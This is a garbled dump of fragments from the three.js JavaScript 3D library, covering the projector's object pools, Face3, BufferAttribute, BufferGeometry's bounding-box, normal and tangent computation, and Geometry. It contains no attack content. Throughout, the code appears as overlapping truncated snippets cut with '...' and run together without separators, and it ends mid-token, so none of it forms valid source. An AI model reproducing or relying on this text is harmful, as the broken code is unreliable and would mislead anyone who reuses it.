nScreen_line.z ... en.z );_line.z ... een.z )Math.ma ... een.z )_clippe ... creen.zif ( ob ... \t\t\t\t\t\t}object. ... xColors_line.v ...  v ] );_line.v ... [ v ] )_line.v ...  ].copy_line.v ... rs[ 0 ]_line.vertexColorsobject. ... rs[ v ]object. ... .colors_line.v ...  1 ] );_line.v ... - 1 ] )_line.v ... rs[ 1 ]object. ... v - 1 ]v - 1_vector ... ], 1 );_vector ... 4], 1 )_vector4.set_modelM ... nts[12]_modelM ... lements_modelM ... nts[13]_modelM ... nts[14]_vector ... Matrix4var inv ... tor4.w;invW =  ... ctor4.w1 / _vector4.w_vector4.w_vector4.z *= invW;_vector4.z *= invW_vector4.zif ( _v ... \r\n\t\t\t\t}_vector ... .z <= 1_vector4.z >= -1_vector4.z <= 1_sprite ... Pool();_sprite ... nPool()_sprite ... ect.id;_sprite ... ject.id_sprite.id_sprite ... * invW;_sprite ...  * invW_sprite.x_vector4.x * invW_vector4.x_sprite.y_vector4.y * invW_vector4.y_sprite ... tor4.z;_sprite ... ctor4.z_sprite.z_sprite ... object;_sprite ...  object_sprite.object_sprite ... tation;_sprite ... otation_sprite.rotationobject.rotation_sprite ... 2] ) );_sprite ... 12] ) )_sprite.scale.x_sprite.scaleobject. ... 12] ) )Math.ab ... 12] ) )_sprite ... s[12] )( _vect ... s[12] )( _vect ... ts[0] )_vector ... ents[0]camera. ... ents[0]camera. ... lements_vector ... nts[12]camera. ... nts[12]_sprite ... 3] ) );_sprite ... 13] ) )_sprite.scale.yobject. ... 13] ) )object.scale.yMath.ab ... 13] ) )_sprite ... s[13] )( _vect ... s[13] )( _vect ... ts[5] )_vector ... ents[5]camera. ... ents[5]_vector ... nts[13]camera. ... nts[13]_sprite ... terial;_sprite ... aterial_sprite.material_render ... rite );_render ... prite )if ( so ... Sort );sortEle ... == truereturn _renderData;if ( _o ... \r\n\r\n\t\t}_object ... lLengthvar obj ... ject();object  ... bject()new THR ... bject()THREE.R ... eObject_object ... ject );_object ... bject )_objectPool.push_object ... gth ++;_objectPoolLength ++_objectCount ++;_objectCount ++return  ... t ++ ];_object ... nt ++ ]if ( _v ... \r\n\r\n\t\t}_vertex ... lLengthvar ver ... rtex();vertex  ... ertex()new THR ... ertex()THREE.R ... eVertex_vertex ... rtex );_vertex ... ertex )_vertexPool.push_vertex ... gth ++;_vertexPoolLength ++_vertexCount ++;_vertexCount ++return vertex;_vertex ... nt ++ ]if ( _f ... \r\n\r\n\t\t}_faceCo ... lLengthvar fac ... Face();face =  ... eFace()new THR ... eFace()THREE.RenderableFace_facePo ... face );_facePo ...  face )_facePool.push_facePoolLength ++;_facePoolLength ++_faceCount ++;_faceCount ++return face;_facePo ... nt ++ ]if ( _l ... \r\n\r\n\t\t}_lineCo ... lLengthvar lin ... Line();line =  ... eLine()new THR ... eLine()THREE.RenderableLine_linePo ... line );_linePo ...  line )_linePool.push_linePoolLength ++;_linePoolLength ++_lineCount ++return line;_linePo ... nt ++ ]if ( _s ... \r\n\r\n\t\t}_sprite ... lLengthvar spr ... rite();sprite  ... prite()new THR ... prite()THREE.R ... eSprite_sprite ... rite );_sprite ... prite )_spritePool.push_sprite ... gth ++;_spritePoolLength ++_spriteCount ++return sprite;_sprite ... nt ++ ]if ( a. ... \r\n\r\n\t\t}a.z !== b.zreturn b.z - a.z;b.z - a.za.id !== b.ida.idb.idreturn a.id - b.id;a.id - b.idvar alp ... + s2.w;alpha1 = 0alpha2 = 1bc1near ...  + s1.ws1.z + s1.ws1.zs1.wbc2near ...  + s2.ws2.z + s2.ws2.zs2.wbc1far  ...  + s1.w- s1.z + s1.w- s1.zbc2far  ...  + s2.w- s2.z + s2.w- s2.zif ( bc ... \r\n\r\n\t\t}bc1near ... ar >= 0bc1near >= 0bc2near >= 0bc1far >= 0bc2far >= 0( bc1ne ... r < 0 )( bc1ne ... ar < 0)bc1near ... ear < 0bc1near < 0bc2near < 0(bc1far ... r < 0 )bc1far  ... far < 0bc1far < 0bc2far < 0if ( bc ... \n\r\n\t\t\t}alpha1  ... ar ) );alpha1  ... ear ) )Math.ma ... ear ) )bc1near ... 2near )( bc1ne ... 2near )bc1near - bc2nearalpha2  ... ar ) );alpha2  ... ear ) )Math.mi ... ear ) )alpha1  ... far ) )Math.ma ... far ) )bc1far  ... c2far )( bc1far - bc2far )bc1far - bc2faralpha2  ... far ) )Math.mi ... far ) )if ( al ... \n\r\n\t\t\t}alpha2 < alpha1s1.lerp ... pha1 );s1.lerp ... lpha1 )s1.lerps2.lerp ... pha2 );s2.lerp ... lpha2 )s2.lerp1 - alpha2THREE.F ... 0;\r\n\r\n}THREE.Face3this.a = a;this.a = athis.c = c;this.c = cthis.no ... tor3();this.no ... ctor3()normal  ... Vector3this.ve ...  : [ ];this.ve ... l : [ ]this.vertexNormalsnormal  ... l : [ ]normal  ... f Array[ ]this.co ... olor();this.co ... Color()this.colorcolor i ... Color()color i ... E.Colorthis.ve ... r : [];this.ve ... or : []this.vertexColorscolor i ... or : []color i ... f Arraythis.ve ... s = [];this.ve ... ts = []this.vertexTangentsthis.ma ... ex : 0;this.ma ... dex : 0this.materialIndexmateria ... dex : 0constru ... E.Face3var fac ... is.c );face =  ... his.c )new THR ... his.c )face.no ... rmal );face.no ... ormal )face.normal.copyface.co ... olor );face.co ... color )face.color.copyface.ma ... lIndex;face.ma ... alIndexvar i, il;for ( i ... lone();i = 0,  ... .lengththis.ve ... .lengthface.ve ... lone();face.ve ... clone()face.ve ... ls[ i ]this.ve ... clone()this.ve ... ].clonethis.ve ... ls[ i ]face.ve ... rs[ i ]face.vertexColorsthis.ve ... rs[ i ]face.ve ... ts[ i ]face.vertexTangentsthis.ve ... ts[ i ]THREE.F ... );\r\n\r\n}THREE.Face4{\r\n\r\n\tc ... );\r\n\r\n}THREE.Face4 has been removed. A THREE.Face3 will be created instead.Face4 has been removed A THREEFace3 will be created insteadreturn  ... ndex );new THR ... Index )THREE.B ...  () {};THREE.B ... n () {}THREE.B ... tributeTHREE.B ... ototypeconstru ... tributeget len ... ;\r\n\r\n\t}return  ... length;this.array.lengththis.arraythis.ar ... alue );this.ar ... value )this.array.setthis.ar ...  ] = x;this.ar ... e ] = xthis.ar ... mSize ]index * ... temSizethis.itemSizethis.ar ...  ] = y;this.ar ... 1 ] = ythis.ar ... e + 1 ]index * ... ize + 1this.ar ...  ] = z;this.ar ... 2 ] = zthis.ar ... e + 2 ]index * ... ize + 2setXY:  ... ;\r\n\r\n\t}index * ... emSize;this.ar ...   ] = xthis.ar ... x     ]this.ar ... x + 1 ]setXYZ: ... ;\r\n\r\n\t}this.ar ... x + 2 ]index + 2setXYZW ... ;\r\n\r\n\t}this.ar ...  ] = w;this.ar ... 3 ] = wthis.ar ... x + 3 ]index + 3THREE.I ... ;\r\n\r\n};THREE.I ... e;\r\n\r\n}THREE.Int8Attributethis.ar ... Size );this.ar ... mSize )new Int ... mSize )size * itemSizethis.it ... emSize;this.it ... temSizeTHREE.I ... type );THREE.I ... otype )THREE.I ... ototypeTHREE.U ... ;\r\n\r\n};THREE.U ... e;\r\n\r\n}THREE.Uint8Attributenew Uin ... mSize )THREE.U ... type );THREE.U ... otype )THREE.U ... ototypeTHREE.U ... tributeUint8Cl ... tributeTHREE.Int16AttributeTHREE.Int32AttributeTHREE.F ... e;\r\n\r\n}THREE.F ... tributenew Flo ... mSize )THREE.F ... type );THREE.F ... otype )THREE.B ... l;\r\n\r\n}functio ... l;\r\n\r\n}{\r\n\r\n\tt ... l;\r\n\r\n}THREE.G ... ount ++THREE.G ... IdCountthis.at ... s = {};this.attributes = {}this.attributesthis.drawcalls = [];this.drawcalls = []this.drawcallsthis.of ... wcalls;this.of ... awcallsthis.offsetsthis.bo ... = null;this.bo ...  = nullthis.boundingBoxthis.boundingSphereconstru ... eometryaddAttr ... ;\r\n\r\n\t}if ( at ... \r\n\r\n\t\t}attribu ... = falseattribu ... tributeconsole ...  ).' );console ... e ).' )'DEPREC ... ute ).'DEPRECATED: BufferGeometry's addAttribute() now expects ( name, attribute ).DEPRECATED: BufferGeometry's addAttribute now expects ( name, attribute ) name, attribute this.at ...  2 ] };this.at ... [ 2 ] }this.at ...  name ]{ array ... [ 2 ] }array:  ... ts[ 1 ]itemSiz ... ts[ 2 ]this.at ... ribute;this.at ... tributegetAttr ... ;\r\n\r\n\t}return  ... name ];addDraw ... ;\r\n\r\n\t}this.dr ... \n\t\t} );this.dr ... \r\n\t\t} )this.drawcalls.pushstart: startcount: countindex:  ... set : 0indexOf ... set : 0indexOf ... definedapplyMa ... }\r\n\r\n\t}this.at ... ositionpositio ... definedmatrix. ... rray );matrix. ... array )matrix. ... r3Arrayposition.arraypositio ... = true;positio ...  = trueposition.needsUpdatevar nor ... normal;normal  ... .normalthis.at ... .normalif ( no ... \r\n\r\n\t\t}new THR ... atrix )new THR ... lMatrixnormalM ... rray );normalM ... array )normalM ... r3Arraynormal.arraynormal. ... = true;normal. ...  = truenormal.needsUpdatecompute ... }\r\n\r\n\t}this.bo ... == nullthis.bo ... Box3();this.bo ... .Box3()positio ... ].arraythis.at ... ].arraythis.at ... tion" ]var bb  ... ingBox;bb = th ... dingBoxif( pos ... ;\r\n\t\t\t}positio ... th >= 3bb.min. ... s[ 0 ];bb.min. ... ns[ 0 ]bb.min.xbb.minbb.max. ... ns[ 0 ]bb.max.xbb.maxpositions[ 0 ]bb.min. ... s[ 1 ];bb.min. ... ns[ 1 ]bb.min.ybb.max. ... ns[ 1 ]bb.max.ypositions[ 1 ]bb.min. ... s[ 2 ];bb.min. ... ns[ 2 ]bb.min.zbb.max. ... ns[ 2 ]bb.max.zpositions[ 2 ]i = 3il = po ... .lengthvar x = ... s[ i ];x = positions[ i ]var y = ...  + 1 ];y = pos ... i + 1 ]var z = ...  + 2 ];z = pos ... i + 2 ]if ( x  ... \r\n\t\t\t\t}x < bb.min.xbb.min.x = x;bb.min.x = xx > bb.max.xbb.max.x = x;bb.max.x = xif ( y  ... \r\n\t\t\t\t}y < bb.min.ybb.min.y = y;bb.min.y = yy > bb.max.ybb.max.y = y;bb.max.y = yif ( z  ... \r\n\t\t\t\t}z < bb.min.zbb.min.z = z;bb.min.z = zz > bb.max.zbb.max.z = z;bb.max.z = zpositio ... h === 0this.bo ... 0, 0 );this.bo ...  0, 0 )this.bo ... min.setthis.boundingBox.minthis.bo ... max.setthis.boundingBox.maxcompute ... \n\r\n\t}()this.bo ... here();this.bo ... phere()if ( po ... \n\r\n\t\t\t}box.makeEmpty();box.makeEmpty()box.makeEmptythis.bo ... .centervector. ...  2 ] );vector. ... + 2 ] )box.add ... ctor );box.add ... ector )box.addPointbox.cen ... nter );box.center( center )box.centermaxRadi ... or ) );maxRadi ... tor ) )Math.ma ... tor ) )center. ... ector )this.bo ... usSq );this.bo ... iusSq )this.bo ... .radiuscompute ... y\r\n\r\n\t}functio ... y\r\n\r\n\t}{\r\n\r\n\t\t ... y\r\n\r\n\t}var j, jl;var nVe ... length;nVertex ... .lengththis.at ... .lengththis.at ... definedthis.at ... rmal" ]this.at ... \n\t\t\t\t};this.at ... \r\n\t\t\t\t}itemSize: 3array:  ... ments )new Flo ... ments )for ( i ... \r\n\t\t\t\t}this.at ...  ] = 0;this.at ... i ] = 0this.at ... ay[ i ]normals ... ].arrayvar vA, ... tor3();pA = ne ... ctor3()pB = ne ... ctor3()pC = ne ... ctor3()cb = ne ... ctor3()ab = ne ... ctor3()this.at ... ndex" ]indices ... ].arrayvar off ... 0 } ]);offsets ...  0 } ])(this.o ...  0 } ])this.of ... : 0 } ]this.of ... gth > 0this.offsets.lengthfor ( j ... \r\n\t\t\t\t}j < jl++ jj = 0,  ... .lengthj = 0jl = offsets.lengthoffsets[ j ].startoffsets[ j ]offsets[ j ].countoffsets[ j ].indexfor ( i ... \n\t\t\t\t\t}i = sta ... + countvA = in ... s[ i ];vA = in ... es[ i ]vB = in ...  + 1 ];vB = in ... i + 1 ]vC = in ...  + 2 ];vC = in ... i + 2 ]x = pos ...  * 3 ];x = pos ... A * 3 ]positions[ vA * 3 ]vA * 3y = pos ...  + 1 ];y = pos ... 3 + 1 ]vA * 3 + 1z = pos ...  + 2 ];z = pos ... 3 + 2 ]vA * 3 + 2pA.set( x, y, z );pA.set( x, y, z )pA.setx = pos ... B * 3 ]positions[ vB * 3 ]vB * 3vB * 3 + 1vB * 3 + 2pB.set( x, y, z );pB.set( x, y, z )pB.setx = pos ... C * 3 ]positions[ vC * 3 ]vC * 3vC * 3 + 1vC * 3 + 2pC.set( x, y, z );pC.set( x, y, z )pC.setcb.subV ... , pB );cb.subV ... C, pB )cb.subVectorsab.subV ... , pB );ab.subV ... A, pB )ab.subVectorscb.cross( ab );cb.cross( ab )cb.crossnormals ... = cb.x;normals ... += cb.xnormals ... 3     ]cb.xnormals ... = cb.y;normals ... += cb.ynormals ... 3 + 1 ]cb.ynormals ... = cb.z;normals ... += cb.znormals ... 3 + 2 ]cb.zi += 9x = positions[ i ];x = pos ...  + 3 ];x = pos ... i + 3 ]positions[ i + 3 ]i + 3y = pos ...  + 4 ];y = pos ... i + 4 ]positions[ i + 4 ]i + 4z = pos ...  + 5 ];z = pos ... i + 5 ]positions[ i + 5 ]i + 5x = pos ...  + 6 ];x = pos ... i + 6 ]positions[ i + 6 ]i + 6y = pos ...  + 7 ];y = pos ... i + 7 ]positions[ i + 7 ]i + 7z = pos ...  + 8 ];z = pos ... i + 8 ]positions[ i + 8 ]i + 8normals ...  = cb.xnormals[ i     ]normals ...  = cb.ynormals ...  = cb.znormals[ i + 3 ]normals[ i + 4 ]normals[ i + 5 ]normals[ i + 6 ]normals[ i + 7 ]normals[ i + 8 ]this.no ... mals();this.no ... rmals()this.no ... Normalsthis.no ... = true;this.no ...  = truethis.no ... dUpdatethis.at ...  "uv" ]console ... s()" );console ... ts()" )"Missin ... ents()"Missing required attributes (index, position, normal or uv) in BufferGeometry.computeTangents()Missing required attributes (index, position, normal or uv)index, position, normal or uv in BufferGeometryuvs = t ... ].arrayvar nVe ... th / 3;nVertic ... gth / 3this.at ... gent" ]var nTa ... rtices;nTangen ... ertices4 * nVerticesthis.at ... \r\n\t\t\t};this.at ... \n\r\n\t\t\t}itemSize: 4var tan ... .array;tangent ... ].arrayvar tan ... 2 = [];tan1 = []tan2 = []k < nVerticesk ++var k = 0k = 0tan1[ k ... tor3();tan1[ k ... ctor3()tan1[ k ]tan2[ k ... tor3();tan2[ k ... ctor3()tan2[ k ]var xA, ...  t2, r;var sdi ... tor3();sdir =  ... ctor3()tdir =  ... ctor3()xA = po ...  * 3 ];xA = po ... a * 3 ]yA = po ...  + 1 ];yA = po ... 3 + 1 ]zA = po ...  + 2 ];zA = po ... 3 + 2 ]xB = po ...  * 3 ];xB = po ... b * 3 ]yB = po ...  + 1 ];yB = po ... 3 + 1 ]zB = po ...  + 2 ];zB = po ... 3 + 2 ]xC = po ...  * 3 ];xC = po ... c * 3 ]yC = po ...  + 1 ];yC = po ... 3 + 1 ]zC = po ...  + 2 ];zC = po ... 3 + 2 ]uA = uvs[ a * 2 ];uA = uvs[ a * 2 ]uvs[ a * 2 ]a * 2vA = uv ...  + 1 ];vA = uv ... 2 + 1 ]uvs[ a * 2 + 1 ]a * 2 + 1uB = uvs[ b * 2 ];uB = uvs[ b * 2 ]uvs[ b * 2 ]b * 2vB = uv ...  + 1 ];vB = uv ... 2 + 1 ]uvs[ b * 2 + 1 ]b * 2 + 1uC = uvs[ c * 2 ];uC = uvs[ c * 2 ]uvs[ c * 2 ]c * 2vC = uv ...  + 1 ];vC = uv ... 2 + 1 ]uvs[ c * 2 + 1 ]c * 2 + 1x1 = xB - xA;x1 = xB - xAxB - xAx2 = xC - xA;x2 = xC - xAxC - xAy1 = yB - yA;y1 = yB - yAyB - yAy2 = yC - yA;y2 = yC - yAyC - yAz1 = zB - zA;z1 = zB - zAzB - zAz2 = zC - zA;z2 = zC - zAzC - zAs1 = uB - uA;s1 = uB - uAuB - uAs2 = uC - uA;s2 = uC - uAuC - uAt1 = vB - vA;t1 = vB - vAvB - vAt2 = vC - vA;t2 = vC - vAvC - vAr = 1.0 ... * t1 );r = 1.0 ...  * t1 )1.0 / ( ...  * t1 )( s1 *  ...  * t1 )s1 * t2 - s2 * t1s1 * t2s2 * t1sdir.se ... \r\n\t\t\t);sdir.se ... r\r\n\t\t\t)sdir.set( t2 *  ... 2 ) * r( t2 *  ...  * x2 )t2 * x1 - t1 * x2t2 * x1t1 * x2( t2 *  ...  * y2 )t2 * y1 - t1 * y2t2 * y1t1 * y2( t2 *  ...  * z2 )t2 * z1 - t1 * z2t2 * z1t1 * z2tdir.se ... \r\n\t\t\t);tdir.se ... r\r\n\t\t\t)tdir.set( s1 *  ... 1 ) * r( s1 *  ...  * x1 )s1 * x2 - s2 * x1s1 * x2s2 * x1( s1 *  ...  * y1 )s1 * y2 - s2 * y1s1 * y2s2 * y1( s1 *  ...  * z1 )s1 * z2 - s2 * z1s1 * z2s2 * z1tan1[ a ... sdir );tan1[ a ...  sdir )tan1[ a ].addtan1[ a ]tan1[ b ... sdir );tan1[ b ...  sdir )tan1[ b ].addtan1[ b ]tan1[ c ... sdir );tan1[ c ...  sdir )tan1[ c ].addtan1[ c ]tan2[ a ... tdir );tan2[ a ...  tdir )tan2[ a ].addtan2[ a ]tan2[ b ... tdir );tan2[ b ...  tdir )tan2[ b ].addtan2[ b ]tan2[ c ... tdir );tan2[ c ...  tdir )tan2[ c ].addtan2[ c ]var iA, iB, iC;for ( j ... \r\n\r\n\t\t}for ( i ... \n\r\n\t\t\t}iA = in ... s[ i ];iA = in ... es[ i ]iB = in ...  + 1 ];iB = in ... i + 1 ]iC = in ...  + 2 ];iC = in ... i + 2 ]handleT ... , iC );handleT ... B, iC )var tmp ... tor3();tmp = n ... ctor3()tmp2 =  ... ctor3()var n = ... tor3();n = new ... ctor3()n2 = ne ... ctor3()var w, t, test;n.x = n ...  * 3 ];n.x = n ... v * 3 ]n.xnormals[ v * 3 ]v * 3n.y = n ...  + 1 ];n.y = n ... 3 + 1 ]n.ynormals[ v * 3 + 1 ]v * 3 + 1n.z = n ...  + 2 ];n.z = n ... 3 + 2 ]n.znormals[ v * 3 + 2 ]v * 3 + 2n2.copy( n );n2.copy( n )n2.copyt = tan1[ v ];t = tan1[ v ]tan1[ v ]tmp.copy( t );tmp.copy( t )tmp.copytmp.sub ... lize();tmp.sub ... alize()tmp.sub ... rmalizetmp.sub ... t ) ) )tmp.subn.multi ... ( t ) )n.multiplyScalarn.dot( t )n.dottmp2.cr ... 2, t );tmp2.cr ... n2, t )tmp2.crossVectorstest =  ...  v ] );test =  ... [ v ] )tmp2.do ... [ v ] )tmp2.dottan2[ v ]w = ( t ...  : 1.0;w = ( t ... 0 : 1.0( test  ... 0 : 1.0( test < 0.0 )test < 0.0tangent ...  tmp.x;tangent ... = tmp.xtangent ... 4     ]v * 4tmp.xtangent ...  tmp.y;tangent ... = tmp.ytangent ... 4 + 1 ]v * 4 + 1tmp.ytangent ...  tmp.z;tangent ... = tmp.ztangent ... 4 + 2 ]v * 4 + 2tmp.ztangent ...  ] = w;tangent ... 3 ] = wtangent ... 4 + 3 ]v * 4 + 3handleVertex( iA );handleVertex( iA )handleVertex( iB );handleVertex( iB )handleVertex( iC );handleVertex( iC )compute ... ts;\r\n\t}functio ... ts;\r\n\t}{\r\n\r\n\t\t ... ts;\r\n\t}var siz ... erSize;size =  ... ferSizeif(inde ...  65535;indexBu ... definedsize = 65535;size = 65535var s = Date.now();s = Date.now()this.at ... index']var ver ... .array;vertice ... ].arraythis.at ... ition']var ver ... gth/3);vertice ... ngth/3)(vertices.length/3)vertices.length/3var fac ... gth/3);facesCo ... ngth/3)(indices.length/3)indices.length/3var sor ... ngth );sortedI ... ength )new Uin ... ength )var indexPtr = 0;indexPtr = 0var vertexPtr = 0;vertexPtr = 0var off ... :0 } ];offsets ... x:0 } ][ { sta ... x:0 } ]{ start ... dex:0 }start:0count:0index:0var off ... ets[0];offset = offsets[0]offsets[0]var dup ... es = 0;duplica ... ces = 0var new ... ps = 0;newVerticeMaps = 0var fac ... ray(6);faceVer ... rray(6)new Int32Array(6)var ver ... ngth );vertexM ... ength )new Int ... ength )var rev ... ngth );revVert ... ength )for(var ... = -1; }j < vertices.lengthvar j = 0{ verte ... = -1; }vertexMap[j] = -1;vertexMap[j] = -1vertexMap[j]revVert ... ] = -1;revVertexMap[j] = -1revVertexMap[j]for(var ... \t}\r\n\t\t}findex < facesCountfindex++var findex = 0findex = 0{\r\n\t\t\tn ... \t}\r\n\t\t}newVerticeMaps = 0;for(var ... }\r\n\t\t\t}vo < 3vo++var vo = 0vo = 0{\r\n\t\t\t\t ... }\r\n\t\t\t}var vid ... + vo ];vid = i ...  + vo ]indices ...  + vo ]findex*3 + vofindex*3if(vert ... \r\n\t\t\t\t}vertexMap[vid] == -1vertexMap[vid]faceVer ...  = vid;faceVer ... ] = vidfaceVertices[vo*2]vo*2faceVer ... ] = -1;faceVer ... 1] = -1faceVertices[vo*2+1]vo*2+1newVerticeMaps++;newVerticeMaps++vertexM ... t.indexduplica ... ices++;duplicatedVertices++faceVer ... p[vid];faceVer ... ap[vid]var fac ... ceMaps;faceMax ... iceMapsvertexP ... iceMapsif(face ... }\r\n\t\t\t}faceMax ... + size)(offset ... + size)offset.index + sizevar new ... xPtr };new_off ... exPtr }{ start ... exPtr }start:indexPtrindex:vertexPtroffsets ... ffset);offsets ... offset)offsets.pushoffset = new_offset;offset = new_offsetfor(var ... \r\n\t\t\t\t}v < 6v+=2var v = 0var new ... s[v+1];new_vid ... es[v+1]faceVertices[v+1]v+1if(new_ ... ] = -1;new_vid ... t.indexnew_vid > -1for(var ... ;\r\n\t\t\t}var vid ... ces[v];vid = f ... ices[v]faceVertices[v]if(new_ ... xPtr++;new_vid === -1new_vid ... xPtr++;new_vid ... exPtr++vertexPtr++vertexM ... ew_vid;vertexM ... new_vidrevVert ...  = vid;revVert ... ] = vidrevVert ... ew_vid]sortedI ... .index;sortedI ... t.indexsortedI ... xPtr++]indexPtr++offset.count++;offset.count++this.re ... exPtr);this.re ... texPtr)this.reorderBuffersthis.of ... ffsets;this.of ... offsetsreturn offsets;merge:  ... ;\r\n\r\n\t}console ... ODO' );console ... TODO' )'Buffer ... : TODO'BufferGeometry.merge(): TODO: TODOnormali ... }\r\n\r\n\t}var x, y, z, n;il = normals.lengthx = normals[ i ];x = normals[ i ]y = nor ...  + 1 ];y = normals[ i + 1 ]z = nor ...  + 2 ];z = normals[ i + 2 ]n = 1.0 ...  * z );n = 1.0 ... z * z )1.0 / M ... z * z )Math.sq ... z * z )x * x + ... + z * zx * x + y * yx * xy * yz * znormals ... ] *= n;normals ...  ] *= nreorder ... \t\t}\r\n\t}var sor ... s = {};sortedA ... es = {}var typ ... rray ];types = ... Array ][ Int8A ... Array ]for( va ... \t}\r\n\t\t}var attr{\r\n\t\t\ti ... \t}\r\n\t\t}if(attr ... ntinue;attr == 'index'var sou ... .array;sourceA ... ].arraythis.at ... s[attr]il = types.lengthtypes.lengthvar type = types[i];type = types[i]types[i]if (sou ... \r\n\t\t\t\t}sourceA ... of typesortedA ... ount );sortedA ... Count )sortedA ... s[attr]new typ ... Count )this.at ... exCountthis.at ... temSizenew_vid ... exCountnew_vid++var new_vid = 0new_vid = 0{\r\n\t\t\tv ... \t}\r\n\t\t}var vid ... w_vid];vid = i ... ew_vid]indexMap[new_vid]for ( v ... ;\r\n\t\t\t}var att ... .array;attrArr ... ].arrayvar att ... emSize;attrSiz ... temSizevar sor ... [attr];for(var ...  + k ];k < attrSizek++sortedA ...  + k ];sortedA ... e + k ]new_vid ... ize + knew_vid * attrSizeattrArr ... e + k ]vid * attrSize + kvid * attrSizethis.at ... Buffer;this.at ... xBufferfor ( v ... t;\r\n\t\t}{\r\n\t\t\ti ... t;\r\n\t\t}this.at ... [attr];this.at ... xCount;this.at ... umItemsvar geo ... etry();geometr ... metry()new THR ... metry()var sou ... attr ];sourceA ...  attr ]this.at ...  attr ]sourceA ... r.arraysourceAttr.arrayvar att ... \r\n\t\t\t};attribu ... \n\r\n\t\t\t}itemSiz ... temSizesourceAttr.itemSizearray: nullvar typ ... s[ i ];type = types[ i ]types[ i ]if ( so ... \r\n\t\t\t\t}attribu ... rray );attribu ... Array )attribute.arraynew typ ... Array )geometr ... ribute;geometr ... tributegeometr ...  attr ]var off ... s[ i ];offset  ... ts[ i ]this.offsets[ i ]geometr ... \t\t\t} );geometr ... \n\t\t\t} )geometr ... ts.pushstart: offset.startindex: offset.indexcount: offset.countreturn geometry;dispose ... ;\r\n\r\n\t}this.di ... e' } );this.di ... se' } ){ type: 'dispose' }type: 'dispose'THREE.G ... ;\r\n\r\n};THREE.G ... e;\r\n\r\n}this.vertices = [];this.vertices = []this.verticesthis.colors = [];this.colors = []this.colorsthis.faces = [];this.faces = []this.facesthis.fa ... = [[]];this.fa ...  = [[]]this.faceVertexUvs[[]]this.mo ... s = [];this.mo ... ts = []this.morphTargetsthis.mo ... rs = []this.morphColorsthis.mo ... ls = []this.morphNormalsthis.sk ... s = [];this.sk ... ts = []this.skinWeightsthis.sk ... es = []this.skinIndicesthis.li ... s = [];this.li ... es = []this.lineDistancesthis.ha ...  false;this.ha ... = falsethis.hasTangentsthis.dynamic = true;this.dynamic = truethis.dynamicthis.ve ...  false;this.ve ... = falsethis.ve ... dUpdatethis.el ...  false;this.el ... = falsethis.el ... dUpdatethis.uv ...  false;this.uv ... = falsethis.uvsNeedUpdatethis.ta ...  false;this.ta ... = falsethis.ta ... dUpdatethis.co ...  false;this.co ... = falsethis.co ... dUpdatethis.li ...  false;this.li ... = falsethis.li ... dUpdatelineDis ... dUpdatethis.bu ...  false;this.bu ... = falsethis.bu ... dUpdateTHREE.G ... }\r\n\r\n};THREE.G ... \t}\r\n\r\n}THREE.G ... ototypethis.vertices.lengthvar ver ... s[ i ];vertex  ... es[ i ]this.vertices[ i ]vertex. ... trix );vertex. ... atrix )vertex.applyMatrix4this.faces.lengthvar fac ... s[ i ];face =  ... es[ i ]this.faces[ i ]face.no ... lize();face.no ... alize()face.no ... rmalizeface.no ... atrix )face.no ... Matrix3j ++var j = ... .lengthjl = fa ... .lengthface.ve ... .lengthface.ve ... lize();face.ve ... alize()face.ve ... rmalizeface.ve ... atrix )face.ve ... Matrix3face.ve ... ls[ j ]this.bo ... EE.Box3this.co ... gBox();this.co ... ngBox()this.co ... dingBoxthis.bo ... .Spherethis.co ... here();this.co ... phere()this.co ... gSpherevar cb  ... tor3();fl = th ... .lengththis.faces[ f ]var vA  ... ce.a ];vA = th ... ace.a ]this.ve ... ace.a ]var vB  ... ce.b ];vB = th ... ace.b ]this.ve ... ace.b ]var vC  ... ce.c ];vC = th ... ace.c ]this.ve ... ace.c ]cb.subV ... , vB );cb.subV ... C, vB )ab.subV ... , vB );ab.subV ... A, vB )cb.normalize();cb.normalize()cb.normalizeface.no ... ( cb );face.no ... y( cb )var v,  ... rtices;vertice ... ngth );vertice ... ength )new Arr ... ength )v = 0,  ... .lengthvl = th ... .lengthvertice ... tor3();vertice ... ctor3()if ( ar ... \r\n\r\n\t\t}var vA, vB, vC, vD;db = ne ... ctor3()dc = ne ... ctor3()bc = ne ... ctor3()for ( f ... \n\r\n\t\t\t}f = 0,  ... .lengthface =  ... s[ f ];vA = th ... ce.a ];vB = th ... ce.b ];vC = th ... ce.c ];vertice ... ( cb );vertice ... d( cb )vertice ... a ].addvertice ... b ].addvertice ... c ].addvertice ... rmal );vertice ... ormal )vertice ... lize();vertice ... alize()vertice ... rmalizefor ( f ... \r\n\r\n\t\t}face.ve ... ls[ 0 ]vertice ... clone()vertice ... ].cloneface.ve ... ls[ 1 ]face.ve ... ls[ 2 ]var i,  ... , face;if ( !  ... \n\r\n\t\t\t}! face. ... eNormalface.__ ... eNormalface.__ ... lone();face.__ ... clone()face.normal.clone()face.normal.cloneface.__ ... rmal );face.__ ... ormal )face.__ ... al.copyif ( !  ... s = [];! face. ... Normalsface.__ ... Normals__origi ... Normalsface.__ ... s = [];face.__ ... ls = []il = fa ... .lengthif ( !  ... \r\n\t\t\t\t}! face. ... ls[ i ]face.__ ... ls[ i ]face.ve ... ].cloneface.__ ...  i ] );face.__ ... [ i ] )face.__ ...  ].copyvar tmp ... etry();tmpGeo  ... metry()new THREE.Geometry()tmpGeo. ... .faces;tmpGeo. ... s.facestmpGeo.facesthis.mo ... .length! this. ... ls[ i ]this.mo ... ls[ i ]this.mo ... ] = {};this.mo ...  ] = {}this.mo ... Normalsvar dst ... ormals;dstNorm ... Normalsvar fac ... ormals;for ( f ... \r\n\t\t\t\t}faceNor ... tor3();faceNor ... ctor3()vertexN ... r3() };vertexN ... or3() }{ a: ne ... or3() }a: new  ... ctor3()b: new  ... ctor3()c: new  ... ctor3()dstNorm ... rmal );dstNorm ... ormal )dstNormalsFace.pushdstNorm ... mals );dstNorm ... rmals )dstNorm ... ex.pushvar mor ... s[ i ];morphNo ... ls[ i ]tmpGeo. ... rtices;tmpGeo. ... erticestmpGeo.verticesthis.mo ... erticesthis.mo ... ts[ i ]tmpGeo. ... mals();tmpGeo. ... rmals()tmpGeo. ... NormalsfaceNor ... s[ f ];faceNor ... ls[ f ]morphNo ... ls[ f ]morphNo ... NormalsvertexN ... s[ f ];vertexN ... ls[ f ]faceNor ... rmal );faceNor ... ormal )faceNormal.copyvertexN ...  0 ] );vertexN ... [ 0 ] )vertexNormals.a.copyvertexNormals.avertexN ...  1 ] );vertexN ... [ 1 ] )vertexNormals.b.copyvertexNormals.bvertexN ...  2 ] );vertexN ... [ 2 ] )vertexNormals.c.copyvertexNormals.cface.no ... Normal;face.no ... eNormalface.ve 